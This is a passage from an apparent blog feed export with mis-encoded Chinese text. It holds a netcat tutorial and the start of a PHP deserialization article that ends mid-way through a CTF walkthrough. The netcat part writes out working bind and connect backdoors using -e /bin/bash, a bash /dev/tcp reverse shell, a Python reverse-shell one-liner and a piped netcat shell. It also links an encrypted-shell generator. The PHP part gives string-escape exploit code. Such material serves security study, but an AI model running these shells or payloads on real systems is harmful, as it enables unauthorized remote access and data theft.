        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ncè¢«èª‰ä¸ºç½‘ç»œå®‰å…¨ç•Œçš„ç‘å£«å†›åˆ€ï¼Œä¸€ä¸ªç®€å•è€Œæœ‰ç”¨çš„å·¥å…·ï¼Œé€šè¿‡ä½¿ç”¨TCPæˆ–UDPåè®®çš„ç½‘ç»œè¿æ¥å»è¯»å†™æ•°æ®ã€‚</p><h2 id="ä¸‹è½½å®‰è£…"><a href="#ä¸‹è½½å®‰è£…" class="headerlink" title="ä¸‹è½½å®‰è£…"></a>ä¸‹è½½å®‰è£…</h2><p>windowsä¸‹ä¸‹è½½åœ°å€:<a href="https://eternallybored.org/misc/netcat/" target="_blank" rel="noopener">https://eternallybored.org/misc/netcat/</a><br>ä¸‹è½½è§£å‹å°†nc.exe å¤åˆ¶åˆ°C:\Windows\System32çš„æ–‡ä»¶å¤¹ä¸‹cmdå‘½ä»¤ncå³å¯(ä¹Ÿå¯ä»¥é…ç¯å¢ƒå˜é‡)<br>linuxä¸‹:ç®¡ç†å‘˜æƒé™ä¸‹<code>apt-get install netcat</code>ï¼Œå‘½ä»¤è¡ŒncæŸ¥çœ‹æ˜¯å¦å®‰è£…æˆåŠŸ</p><h2 id="netcatåŸºæœ¬ä½¿ç”¨"><a href="#netcatåŸºæœ¬ä½¿ç”¨" class="headerlink" title="netcatåŸºæœ¬ä½¿ç”¨"></a>netcatåŸºæœ¬ä½¿ç”¨</h2><p><img src="/images/pasted-84.png" alt="upload successful"></p><h2 id="netcatæ–‡ä»¶äº¤äº’"><a href="#netcatæ–‡ä»¶äº¤äº’" class="headerlink" title="netcatæ–‡ä»¶äº¤äº’"></a>netcatæ–‡ä»¶äº¤äº’</h2><p>åˆ›å»ºä¸€ä¸ªæœåŠ¡å™¨ç«¯æ–¹æ³•ï¼š<br><code>nc -l -p</code><br>åˆ›å»ºä¸€ä¸ªå®¢æˆ·ç«¯æ–¹æ³•(è¿æ¥æœåŠ¡å™¨ç«¯)<br><code>nc [remote_addr] [remoteport]</code></p><p><img src="/images/pasted-85.png" alt="upload successful"></p><p><img src="/images/pasted-86.png" alt="upload successful"></p><h2 id="netcatæ–‡ä»¶ä¼ è¾“"><a href="#netcatæ–‡ä»¶ä¼ è¾“" class="headerlink" title="netcatæ–‡ä»¶ä¼ è¾“"></a>netcatæ–‡ä»¶ä¼ è¾“</h2><p>åˆ›å»ºæœåŠ¡å™¨ç«¯ï¼š<br><code>nc -l -p 4444 &gt; outfile.txt</code><br>å…¶ä¸­outfile.txtæ˜¯è¦æ¥å—åˆ°çš„æ–‡ä»¶<br>åˆ›å»ºå®¢æˆ·ç«¯:<br><code>nc 192.168.124.133 4444 &lt; game.pcapng</code><br>å…¶ä¸­game.pacpngæ˜¯è¦å‘é€çš„æ–‡ä»¶<br>å…¶ä¸­å¦‚æœæœåŠ¡ç«¯å¹¶æ²¡æœ‰å‡†å¤‡å¥½è¿æ¥ï¼Œè€Œå®¢æˆ·ç«¯å·²ç»ä½¿ç”¨ncè¿›è¡Œè¿æ¥ï¼Œé‚£ä¹ˆå®¢æˆ·ç«¯ä¼šä¸€ç›´ç­‰å¾…ï¼Œç›´åˆ°è¿æ¥ä¸ŠæœåŠ¡å™¨ï¼Œé€ æˆâ€™å‡æ­»â€™çŠ¶æ€.<br>è§£å†³æ–¹æ³•:è®¾ç½®ç­‰å¾…æ—¶é—´<br><code>nc -w 3 [ip] [port]               è®¾ç½®ç­‰å¾…æ—¶é—´3ç§’ï¼Œè¶…è¿‡3ç§’é’Ÿï¼Œå®¢æˆ·ç«¯ç›´æ¥å…³é—­ç­‰å¾…è¿æ¥ã€‚</code><br>netcatä¿¡æ¯æ¢æµ‹<br>ç«¯å£æ‰«æä½¿ç”¨</p><pre><code>nc -v -n -z -w1 [target_ip] [start_target_port-stop_target_port]nc -v -n -z -w1 192.168.124.133 1-1000</code></pre><p>å¥½å§è¿™ä¸ªä¸å’Œnmapä¸€æ ·è›®ï¼Œå…¶å®å’Œnmapæ˜¯ä¸€ä¸ªä½œè€…éƒ½åˆ©ç”¨tcp/ipæ¥åˆ¤æ–­</p><p><img src="/images/pasted-87.png" alt="upload successful"></p><h2 id="netcatå»ºç«‹åé—¨"><a href="#netcatå»ºç«‹åé—¨" class="headerlink" title="netcatå»ºç«‹åé—¨"></a>netcatå»ºç«‹åé—¨</h2><h3 id="ç›‘å¬å‹åé—¨"><a href="#ç›‘å¬å‹åé—¨" class="headerlink" title="ç›‘å¬å‹åé—¨"></a>ç›‘å¬å‹åé—¨</h3><p>åˆ›å»ºæœåŠ¡å™¨ç«¯:</p><pre><code>ncat -l -e /bin/bash -p 4444</code></pre><p><code>-e è¿æ¥åæ‰§è¡Œæ‰§è¡ŒæŸæ–‡ä»¶</code><br>å…¶ä¸­/bin/bashæ˜¯linuxçš„shellè§£é‡Šå™¨ï¼Œè¿æ¥åæ‰§è¡Œè¯¥æ–‡ä»¶ï¼Œå¦‚æœæ˜¯windowsè¦ç”¨æ¥å‘½ä»¤æ‰§è¡Œ<br><code>ncat -l -e cmd.exe -p 4444</code><br>å®¢æˆ·ç«¯è¿æ¥:æ‰§è¡Œå‘½ä»¤<br><code>nc -w 10 192.168.124.133 4444</code></p><p><img src="/images/pasted-88.png" alt="upload successful"></p><h3 id="è¿æ¥å‹åé—¨"><a href="#è¿æ¥å‹åé—¨" class="headerlink" title="è¿æ¥å‹åé—¨"></a>è¿æ¥å‹åé—¨</h3><p>æœåŠ¡å™¨ç«¯:<br><code>nc -l -p 4444</code><br>è¿æ¥ç«¯<br><code>nc [remote_ip] [remote_port] -e /bin/bash</code><br>windowsä¸‹ä½¿ç”¨-e cmd.exe<br><code>ncat 192.168.124.133 4444 -e /bin/bash</code></p><p><img src="/images/pasted-89.png" alt="upload successful"></p><h2 id="netcatåå¼¹shell-bash"><a href="#netcatåå¼¹shell-bash" class="headerlink" title="netcatåå¼¹shell(bash)"></a>netcatåå¼¹shell(bash)</h2><p>åå¼¹shellå‘½ä»¤ï¼š<br><code>bash -I &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</code><br>pcæ¥å—netcatå‘½ä»¤:<br><code>nc -lvp port</code></p><p><img src="/images/pasted-90.png" alt="upload successful"></p><p><img src="/images/pasted-91.png" alt="upload successful"></p><h2 id="netcatåå¼¹shell-python"><a href="#netcatåå¼¹shell-python" class="headerlink" title="netcatåå¼¹shell(python)"></a>netcatåå¼¹shell(python)</h2><p>æœåŠ¡å™¨ç«¯ï¼š<br><code>python -c &quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;192.168.124.133&#39;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#39;/bin/bash&#39;,&#39;-i&#39;]);&quot;</code><br>å®¢æˆ·ç«¯:<br><code>nc -l -p 4444</code></p><p><img src="/images/pasted-92.png" alt="upload successful"></p><p><img src="/images/pasted-93.png" alt="upload successful"></p><p><img src="/images/pasted-94.png" alt="upload successful"><br>é¦–å…ˆä½¿ç”¨socketä¸è¿œç¨‹å»ºç«‹è¿æ¥ï¼Œå…·æœ‰äº†è¿œç¨‹çš„æ–‡ä»¶æè¿°ç¬¦ï¼Œå¯ä»¥ä½¿ç”¨s.fileno()æ¥æŸ¥çœ‹å…·ä½“å¥—æ¥å­—å»ºç«‹çš„è¿œç¨‹æ–‡ä»¶æè¿°ç¬¦ã€‚</p><p>osåº“çš„dup2æ–¹æ³•å°†æ ‡å‡†è¾“å…¥ã€æ ‡å‡†è¾“å‡ºã€æ ‡å‡†é”™è¯¯è¾“å‡ºé‡å®šå‘åˆ°è¿œç¨‹ï¼Œä½¿ç”¨osçš„subprocessåœ¨æœ¬åœ°å¼€å¯äº†ä¸€ä¸ªå­è¿›ç¨‹ï¼Œä¼ å…¥å‚æ•°â€-iâ€ ä½¿ bash ä»¥äº¤äº’æ¨¡å¼å¯åŠ¨ï¼Œæ ‡å‡†è¾“å…¥ã€æ ‡å‡†è¾“å‡ºã€æ ‡å‡†é”™è¯¯è¾“å‡ºåˆè¢«é‡å®šå‘åˆ°äº†è¿œç¨‹ï¼Œè¿™æ ·å°±å¯ä»¥å®ç°åå¼¹shell.</p><h2 id="netcatåå¼¹shell-ä¸æ”¯æŒ-e"><a href="#netcatåå¼¹shell-ä¸æ”¯æŒ-e" class="headerlink" title="netcatåå¼¹shell(ä¸æ”¯æŒ -e)"></a>netcatåå¼¹shell(ä¸æ”¯æŒ -e)</h2><p>åå¼¹shellå‘½ä»¤ï¼š<br><code>nc ip port | /bin/bash | nc ip port</code><br>ç”¨ç®¡é“æ¥é‡æ–°å®šå‘è¾“å…¥å’Œè¾“å‡º<br>pcæ¥å—netcatå‘½ä»¤<br><code>nc -l -p</code> éœ€è¦å¯åŠ¨ä¸¤ä¸ªç›‘å¬ç«¯å£<br>å…¶ä¸­ä¸€ä¸ªä½œä¸ºè¾“å…¥ï¼Œä¸€ä¸ªä½œä¸ºè¾“å‡º</p><p><img src="/images/pasted-95.png" alt="upload successful"></p><p><img src="/images/pasted-96.png" alt="upload successful"></p><h2 id="ä¸€ä¸ªncshellç”ŸæˆåŠ å¯†å°å·¥å…·-shellpy"><a href="#ä¸€ä¸ªncshellç”ŸæˆåŠ å¯†å°å·¥å…·-shellpy" class="headerlink" title="ä¸€ä¸ªncshellç”ŸæˆåŠ å¯†å°å·¥å…·(shellpy)"></a>ä¸€ä¸ªncshellç”ŸæˆåŠ å¯†å°å·¥å…·(shellpy)</h2><p>åœ°å€ï¼š<a href="https://github.com/DarkSecDevelopers/Shellpy" target="_blank" rel="noopener">https://github.com/DarkSecDevelopers/Shellpy</a></p><p><img src="/images/pasted-97.png" alt="upload successful"></p><p><img src="/images/pasted-98.png" alt="upload successful"><br>åŠ å¯†æ–¹æ³•é“¾æ¥ï¼š<a href="https://github.com/pyca/cryptography/blob/master/src/cryptography/fernet.py" target="_blank" rel="noopener">https://github.com/pyca/cryptography/blob/master/src/cryptography/fernet.py</a><br>ä½¿ç”¨æ–¹æ³•ä¿®æ”¹ipå’Œç«¯å£è¿è¡Œrun.pyï¼Œè¿è¡Œshell.exe<br>å…¶ä¸­shell.pyæ˜¯ç»è¿‡åŠ å¯†çš„</p><p><img src="/images/pasted-99.png" alt="upload successful"></p><h2 id="å‚è€ƒæ–‡ç« åŠè¯´æ˜"><a href="#å‚è€ƒæ–‡ç« åŠè¯´æ˜" class="headerlink" title="å‚è€ƒæ–‡ç« åŠè¯´æ˜"></a>å‚è€ƒæ–‡ç« åŠè¯´æ˜</h2><p>å›½å…‰å¤§ä½¬:<a href="https://www.sqlsec.com/2019/10/nc.html" target="_blank" rel="noopener">https://www.sqlsec.com/2019/10/nc.html</a><br>å°ç‰å¤§ä½¬:<a href="https://www.bilibili.com/video/BV1KZ4y1L7NZ" target="_blank" rel="noopener">https://www.bilibili.com/video/BV1KZ4y1L7NZ</a><br>æœ€åæ¬¢è¿è®¿é—®æˆ‘çš„ä¸ªäººåšå®¢ï¼š<a href="https://lmg66.github.io/">https://lmg66.github.io/</a><br>è¯´æ˜ï¼šæœ¬æ–‡ä»…é™æŠ€æœ¯ç ”ç©¶ä¸è®¨è®ºï¼Œä¸¥ç¦ç”¨äºéæ³•ç”¨é€”ï¼Œå¦åˆ™äº§ç”Ÿçš„ä¸€åˆ‡åæœè‡ªè¡Œæ‰¿æ‹…</p>]]></content>
      
      
      <categories>
          
          <category> å†…ç½‘æ¸—é€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> netcat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title> phpååºåˆ—åŒ–æ¼æ´ </title>
      <link href="/posts/d8e5.html"/>
      <url>/posts/d8e5.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æœ¬æ–‡æ€»ç»“phpçš„ååºåˆ—åŒ–ï¼Œæœ‰phpååºåˆ—å­—ç¬¦ä¸²é€ƒé€¸ï¼Œphpååºåˆ—åŒ–popé“¾æ„é€ ï¼Œphpååºåˆ—åŒ–åŸç”Ÿç±»çš„åˆ©ç”¨ï¼Œpharååºåˆ—åŒ–ï¼Œsessionååºåˆ—åŒ–ï¼Œååºåˆ—åŒ–å°æŠ€å·§ï¼Œå¹¶é™„å¸¦ctfå°é¢˜æ¥è¯´æ˜ï¼Œè¿˜æœ‰phpååºåˆ—åŒ–çš„é¢„é˜²æ–¹æ³•(ä¸ªäººæƒ³æ³•)ï¼Œå»ºè®®æŒ‰éœ€æŸ¥çœ‹ï¼Œå¦‚æœ‰é”™è¯¯è¿˜æœ›æ–§æ­£ã€‚<br>å¦‚éç‰¹åˆ«è¯´æ˜è¿è¡Œç¯å¢ƒä¸ºPHP 7.2.33-1+ubuntu18.04.1</p><h2 id="ä¸ºä»€ä¹ˆè¦åºåˆ—åŒ–ï¼Ÿ"><a href="#ä¸ºä»€ä¹ˆè¦åºåˆ—åŒ–ï¼Ÿ" class="headerlink" title="ä¸ºä»€ä¹ˆè¦åºåˆ—åŒ–ï¼Ÿ"></a>ä¸ºä»€ä¹ˆè¦åºåˆ—åŒ–ï¼Ÿ</h2><p>åºåˆ—åŒ–å¯ä»¥å°†å¯¹è±¡ï¼Œç±»ï¼Œæ•°ç»„ï¼Œå˜é‡ï¼ŒåŒ¿åå‡½æ•°ç­‰ï¼Œè½¬æ¢ä¸ºå­—ç¬¦ä¸²ï¼Œè¿™æ ·ç”¨æˆ·å°±æ–¹ä¾¿å­˜å‚¨å’Œä¼ è¾“ï¼ŒåŒæ—¶æ–¹ä¾¿æ¢å¤ä½¿ç”¨ï¼Œå¯¹æœåŠ¡å™¨ä¹Ÿå‡è½»ä¸€å®šçš„å‹åŠ›ã€‚</p><h2 id="åºåˆ—åŒ–åŸºç¡€"><a href="#åºåˆ—åŒ–åŸºç¡€" class="headerlink" title="åºåˆ—åŒ–åŸºç¡€"></a>åºåˆ—åŒ–åŸºç¡€</h2><p>åºåˆ—åŒ–ä¸ºå­—ç¬¦ä¸²æ—¶å€™ï¼Œå˜é‡å’Œå‚æ•°ä¹‹é—´ç”¨ï¼›éš”å¼€ï¼ŒåŒä¸€ä¸ªå˜é‡å’Œå‚æ•°é—´ç”¨ï¼šå·éš”å¼€ï¼Œä»¥}ä½œä¸ºç»“å°¾ï¼Œå…·ä½“ç»“æ„ï¼Œç”¨ä»¥ä¸‹ä»£ç æ¥çœ‹ä¸‹ç»“æ„</p><pre><code>&lt;?phpclass Lmg{    public $name = &#39;Lmg&#39;;    public $age = 19;    public $blog = &#39;https://lmg66.github.io&#39;;}$lmg1 = new Lmg;echo serialize($lmg1).&quot;\n&quot;;?&gt;</code></pre><p><img src="/images/pasted-35.png" alt="upload successful"></p><h2 id="åºåˆ—åŒ–å±æ€§"><a href="#åºåˆ—åŒ–å±æ€§" class="headerlink" title="åºåˆ—åŒ–å±æ€§"></a>åºåˆ—åŒ–å±æ€§</h2><h3 id="åœ¨ä¸€ä¸ªå¯ä»¥åºåˆ—åŒ–çš„å­—ç¬¦ä¸²ååŠ å…¶ä»–å‚æ•°ä¸å½±å“åºåˆ—åŒ–åçš„ç»“æœ"><a href="#åœ¨ä¸€ä¸ªå¯ä»¥åºåˆ—åŒ–çš„å­—ç¬¦ä¸²ååŠ å…¶ä»–å‚æ•°ä¸å½±å“åºåˆ—åŒ–åçš„ç»“æœ" class="headerlink" title="åœ¨ä¸€ä¸ªå¯ä»¥åºåˆ—åŒ–çš„å­—ç¬¦ä¸²ååŠ å…¶ä»–å‚æ•°ä¸å½±å“åºåˆ—åŒ–åçš„ç»“æœ"></a>åœ¨ä¸€ä¸ªå¯ä»¥åºåˆ—åŒ–çš„å­—ç¬¦ä¸²ååŠ å…¶ä»–å‚æ•°ä¸å½±å“åºåˆ—åŒ–åçš„ç»“æœ</h3><p>å¦‚ï¼š<br>æµ‹è¯•ä»£ç ï¼š</p><pre><code>&lt;?phpclass Lmg{    public $name = &#39;Lmg&#39;;    public $age = 19;    public $blog = &#39;https://lmg66.github.io&#39;;}$lmg1 = new Lmg;echo serialize($lmg1).&quot;\n&quot;;$Lmg2 = serialize($lmg1).&#39;s:4:&quot;blog&quot;;s:23:&quot;https://lmg66.github.io&quot;;}&#39;;echo $Lmg2.&quot;\n&quot;;print_r($lmg1);print_r(unserialize($Lmg2));?&gt;</code></pre><p>æ•ˆæœï¼šå¯ä»¥å‘ç°ï¼Œåé¢åŠ äº†å…¶ä»–å‚æ•°å¹¶ä¸å½±å“åºåˆ—åŒ–åçš„ç»“æœ</p><p><img src="/images/pasted-36.png" alt="upload successful"></p><h3 id="æ˜¾ç¤ºå˜é‡é•¿åº¦å’Œå®é™…é•¿åº¦ä¸åŒ¹é…å°±ä¼šæŠ¥é”™ï¼Œåœ¨è¿™é‡Œåœ¨æŸäº›æƒ…å†µå°±ä¼šäº§ç”Ÿå­—ç¬¦ä¸²é€ƒé€¸"><a href="#æ˜¾ç¤ºå˜é‡é•¿åº¦å’Œå®é™…é•¿åº¦ä¸åŒ¹é…å°±ä¼šæŠ¥é”™ï¼Œåœ¨è¿™é‡Œåœ¨æŸäº›æƒ…å†µå°±ä¼šäº§ç”Ÿå­—ç¬¦ä¸²é€ƒé€¸" class="headerlink" title="æ˜¾ç¤ºå˜é‡é•¿åº¦å’Œå®é™…é•¿åº¦ä¸åŒ¹é…å°±ä¼šæŠ¥é”™ï¼Œåœ¨è¿™é‡Œåœ¨æŸäº›æƒ…å†µå°±ä¼šäº§ç”Ÿå­—ç¬¦ä¸²é€ƒé€¸"></a>æ˜¾ç¤ºå˜é‡é•¿åº¦å’Œå®é™…é•¿åº¦ä¸åŒ¹é…å°±ä¼šæŠ¥é”™ï¼Œåœ¨è¿™é‡Œåœ¨æŸäº›æƒ…å†µå°±ä¼šäº§ç”Ÿå­—ç¬¦ä¸²é€ƒé€¸</h3><p>å¦‚ï¼š<br>æµ‹è¯•ä»£ç ï¼š</p><pre><code>&lt;?phpclass Lmg{    public $name = &#39;Lmg&#39;;    public $age = 19;    public $blog = &#39;https://lmg66.github.io&#39;;}$lmg4 = &#39;O:3:&quot;Lmg&quot;:3:{s:4:&quot;name&quot;;s:3:&quot;Lmg&quot;;s:3:&quot;age&quot;;i:19;s:4:&quot;blog&quot;;s:23:&quot;https://lmg66.github.io&quot;;}&#39;;$lmg5 = &#39;O:3:&quot;Lmg&quot;:3:{s:4:&quot;uname&quot;;s:3:&quot;Lmg&quot;;s:3:&quot;age&quot;;i:19;s:4:&quot;blog&quot;;s:23:&quot;https://lmg66.github.io&quot;;}&#39;;print_r(unserialize($lmg4));print_r(unserialize($lmg5));?&gt;</code></pre><p>æ•ˆæœï¼šå¯ä»¥å‘ç°æˆ‘æ”¹äº†å˜é‡ånameä½¿å®ƒçš„é•¿åº¦å’Œå®é™…4ä¸ç¬¦ï¼Œå°±å‘ç”Ÿäº†æŠ¥é”™ï¼Œæ”¹å…¶ä»–ç±»ä¼¼</p><p><img src="/images/pasted-37.png" alt="upload successful"></p><h3 id="ååºåˆ—å¸¸è§é­”æœ¯å‡½æ•°æ€»è§ˆï¼Œå¯æ„é€ popé“¾"><a href="#ååºåˆ—å¸¸è§é­”æœ¯å‡½æ•°æ€»è§ˆï¼Œå¯æ„é€ popé“¾" class="headerlink" title="ååºåˆ—å¸¸è§é­”æœ¯å‡½æ•°æ€»è§ˆï¼Œå¯æ„é€ popé“¾"></a>ååºåˆ—å¸¸è§é­”æœ¯å‡½æ•°æ€»è§ˆï¼Œå¯æ„é€ popé“¾</h3><pre><code>__constructï¼š å½“åˆ›å»ºç±»çš„æ—¶å€™è‡ªåŠ¨è°ƒç”¨ï¼Œä¹Ÿå°±æ˜¯æ„é€ å‡½æ•°ï¼Œæ— è¿”å›å€¼__destructï¼š å½“ç±»å®ä¾‹å­é”€æ¯æ—¶å€™è‡ªåŠ¨è°ƒç”¨ï¼Œä¹Ÿå°±æ˜¯ææ„å‡½æ•°ï¼Œæ— è¿”å›å€¼ï¼Œå…¶ä¸èƒ½å¸¦å‚æ•°__toStringï¼šå½“å¯¹è±¡è¢«å½“åšä¸€ä¸ªå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è°ƒç”¨ï¼Œæ¯”å¦‚echo $obj ã€‚__sleepï¼š å½“ç±»çš„å®ä¾‹è¢«åºåˆ—åŒ–æ—¶è°ƒç”¨(å…¶è¿”å›éœ€è¦ä¸€ä¸ªæ•°ç»„æˆ–è€…å¯¹è±¡ï¼Œä¸€èˆ¬è¿”å›å¯¹è±¡çš„$this,è¿”å›çš„å€¼è¢«ç”¨æ¥åšåºåˆ—åŒ–çš„å€¼ï¼Œå¦‚æœä¸è¿”å›ï¼Œè¡¨ç¤ºåºåˆ—åŒ–å¤±è´¥)__wakeup: å½“ååºåˆ—åŒ–æ—¶è¢«è°ƒç”¨__call:å½“è°ƒç”¨å¯¹è±¡ä¸­ä¸å­˜åœ¨çš„æ–¹æ³•ä¼šè‡ªåŠ¨è°ƒç”¨è¯¥æ–¹æ³•ã€‚__get:åœ¨è°ƒç”¨ç§æœ‰å±æ€§çš„æ—¶å€™ä¼šè‡ªåŠ¨æ‰§è¡Œ__isset()åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šè°ƒç”¨isset()æˆ–empty()è§¦å‘__unset()åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šä½¿ç”¨unset()æ—¶è§¦å‘</code></pre><h2 id="ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸-æ›¿æ¢åå¯¼è‡´å­—ç¬¦ä¸²å˜é•¿"><a href="#ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸-æ›¿æ¢åå¯¼è‡´å­—ç¬¦ä¸²å˜é•¿" class="headerlink" title="ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸(æ›¿æ¢åå¯¼è‡´å­—ç¬¦ä¸²å˜é•¿)"></a>ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸(æ›¿æ¢åå¯¼è‡´å­—ç¬¦ä¸²å˜é•¿)</h2><p>å­—ç¬¦ä¸²é€ƒé€¸åˆ©ç”¨çš„æ˜¯ååºåˆ—åŒ–çš„å±æ€§å¦‚ä¸Šæ–‡ï¼Œå‡ºç°åŸå› æ˜¯åœ¨åºåˆ—åŒ–å‰è¿›è¡Œäº†å­—ç¬¦ä¸²çš„æ›¿æ¢ï¼Œå¯¼è‡´å­—ç¬¦ä¸²è¢«æ‹“å†²ï¼Œå¯ä»¥å°†åé¢çš„å­—ç¬¦ä¸²æŒ¤å‡ºå»ï¼ŒæŒ¤åˆ°åä¸€ä¸ªå¯¹è±¡çš„å˜é‡ä»è€Œæ”¹å˜å…¶ä»–çš„å˜é‡å€¼ï¼Œé€ æˆé€ƒé€¸ã€‚<br>å¦‚ï¼š<br>æµ‹è¯•ä»£ç ï¼š</p><pre><code>&lt;?phpfunction filter($str){    return str_replace(&#39;bb&#39;, &#39;ccc&#39;, $str);}class A{    public $name=&#39;aaaa&#39;;    public $pass=&#39;123456&#39;;}$AA=new A();echo serialize($AA).&quot;\n&quot;;$res=filter(serialize($AA));$c=unserialize($res);echo $c-&gt;pass;?&gt;</code></pre><p>åºåˆ—åŒ–åçš„å­—ç¬¦ä¸²ä¸ºï¼š<br><code>O:1:&quot;A&quot;:2:{s:4:&quot;name&quot;;s:4:&quot;aaaa&quot;;s:4:&quot;pass&quot;;s:6:&quot;123456&quot;;}</code><br>å¦‚æœèƒ½è®©nameå˜é‡çš„å‚æ•°ä¸º<br><code>&quot;;s:4:&quot;pass&quot;;s:6:&quot;hack&quot;;}</code><br>ç”¨}å·é—­åˆæ‰åé¢çš„passå‚æ•°ï¼Œå°±èƒ½æ”¹passå˜é‡çš„å‚æ•°å€¼ä»è€Œé€ƒé€¸<br>è¦è§£å†³çš„å°±æ˜¯è¿™ä¸ªä½ç½®çš„é•¿åº¦é—®é¢˜ï¼Œåªç”¨è¯»å–åˆ°è¶³å¤Ÿçš„é•¿åº¦ï¼Œæ‰ä¼šåœæ­¢</p><p><img src="/images/pasted-38.png" alt="upload successful"><br>å¯ä»¥å‘ç°åœ¨åºåˆ—åŒ–è¿›è¡Œäº†å­—ç¬¦ä¸²çš„æ›¿æ¢ï¼Œä½†æ›¿æ¢çš„æ—¶å€™bbæ›¿æ¢æˆäº†cccï¼Œä¹Ÿå°±æ˜¯å­—ç¬¦ä¸²å˜é•¿äº†ï¼Œè¾¾åˆ°æˆ‘ä»¬ä¸Šé¢æƒ³è¦çš„ç›®çš„</p><p><img src="/images/pasted-39.png" alt="upload successful"><br>å…ˆåˆ¤æ–­æƒ³è¦æ„é€ çš„å­—ç¬¦ä¸²é•¿åº¦</p><pre><code>&lt;?php$lmg = &#39;&quot;;s:4:&quot;pass&quot;;s:6:&quot;hack&quot;;}&#39;;echo strlen($lmg).&quot;\n&quot;;// $lmg3 = &quot;ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc&quot;;// echo strlen($lmg3);// $lmg2 = &quot;bb&quot;;// echo str_repeat($lmg2, 25);?&gt;</code></pre><p>è¿è¡Œé•¿åº¦ä¸º25ï¼Œä¸€ä¸ªbbæ¢æˆcccï¼Œå°±é€ƒé€¸1ä¸ªå­—ç¬¦ï¼Œä¹Ÿå°±æ˜¯è¯´éœ€è¦25ä¸ªbbæ‰èƒ½å°†åé¢çš„å­—ç¬¦ä¸²ç»™æŒ¤å‡ºæ¥</p><pre><code>&lt;?php// $lmg = &#39;&quot;;s:4:&quot;pass&quot;;s:6:&quot;hack&quot;;}&#39;;// echo strlen($lmg).&quot;\n&quot;;// $lmg3 = &quot;ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc&quot;;// echo strlen($lmg3);$lmg2 = &quot;bb&quot;;echo str_repeat($lmg2, 25);?&gt;</code></pre><p>å°†nameå˜é‡å‚æ•°å˜ä¸º25ä¸ªbb+â€;s:4:â€passâ€;s:6:â€hackâ€;}<br>æµ‹è¯•ä»£ç ï¼š</p><pre><code>&lt;?phpfunction filter($str){    return str_replace(&#39;bb&#39;, &#39;ccc&#39;, $str);}class A{    public $name=&#39;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&quot;;s:4:&quot;pass&quot;;s:4:&quot;hack&quot;;}&#39;;    public $pass=&#39;123456&#39;;}$AA=new A();// echo serialize($AA).&quot;\n&quot;;print_r($AA);$res=filter(serialize($AA));echo $res.&quot;\n&quot;;$c=unserialize($res);print_r($c);// echo $c-&gt;pass.&quot;\n&quot;;?&gt;</code></pre><p>è¿è¡Œç»“æœï¼šæ„é€ å®Œçš„å­—ç¬¦ä¸²ï¼Œååºåˆ—åŒ–åå‘ç°å¯†ç è¢«æ”¹ä¸ºäº†hackï¼Œè€Œæˆ‘ä»¬å¹¶æœªç›´æ¥ä¿®æ”¹passçš„å‚æ•°ï¼Œä»è€Œå®ç°å­—ç¬¦ä¸²çš„é€ƒé€¸</p><p><img src="/images/pasted-40.png" alt="upload successful"></p><h3 id="ä¸€ä¸ªctfä¾‹é¢˜-0CTF-2016-piapiapia"><a href="#ä¸€ä¸ªctfä¾‹é¢˜-0CTF-2016-piapiapia" class="headerlink" title="ä¸€ä¸ªctfä¾‹é¢˜([0CTF 2016]piapiapia)"></a>ä¸€ä¸ªctfä¾‹é¢˜([0CTF 2016]piapiapia)</h3><p>åœ°å€ï¼š<a href="https://buuoj.cn/challenges#[0CTF%202016]piapiapia" target="_blank" rel="noopener">https://buuoj.cn/challenges#[0CTF%202016]piapiapia</a><br>æ‰“å¼€é¢˜ç›®æ‰«æä¸€ä¸‹å‘ç°w<a href="http://www.zipæ–‡ä»¶ä¸‹è½½ï¼Œå› ä¸ºæœ¬æ–‡ä¸»è¦äº¤phpååºåŒ–å°±ä¸ç»•äº†" target="_blank" rel="noopener">www.zipæ–‡ä»¶ä¸‹è½½ï¼Œå› ä¸ºæœ¬æ–‡ä¸»è¦äº¤phpååºåŒ–å°±ä¸ç»•äº†</a><br>å‘ç°config.phpä¸­åˆflagï¼Œæ‰€ä»¥è¦è¯»å–æ–‡ä»¶ï¼Œåœ¨profile.phpä¸­å‘ç°è¯»å–æ–‡ä»¶çš„ä»£ç </p><pre><code>else {        $profile = unserialize($profile);        $phone = $profile[&#39;phone&#39;];        $email = $profile[&#39;email&#39;];        $nickname = $profile[&#39;nickname&#39;];        $photo = base64_encode(file_get_contents($profile[&#39;photo&#39;]));</code></pre><p>å¦‚æœèƒ½è®©photoä¸ºconfig.phpï¼Œè€Œè¿™æ•°å€¼æ¥è‡ª$profileçš„ååºåˆ—åŒ–ï¼ŒæŸ¥çœ‹$profile</p><pre><code>public function update_profile($username, $new_profile) {        $username = parent::filter($username);        $new_profile = parent::filter($new_profile);        $where = &quot;username = &#39;$username&#39;&quot;;        return parent::update($this-&gt;table, &#39;profile&#39;, $new_profile, $where);    }</code></pre><p>å‘ç°æœ‰è¿‡æ»¤</p><pre><code>public function filter($string) {        $escape = array(&#39;\&#39;&#39;, &#39;\\\\&#39;);        $escape = &#39;/&#39; . implode(&#39;|&#39;, $escape) . &#39;/&#39;;        $string = preg_replace($escape, &#39;_&#39;, $string);        $safe = array(&#39;select&#39;, &#39;insert&#39;, &#39;update&#39;, &#39;delete&#39;, &#39;where&#39;);        $safe = &#39;/&#39; . implode(&#39;|&#39;, $safe) . &#39;/i&#39;;        return preg_replace($safe, &#39;hacker&#39;, $string);    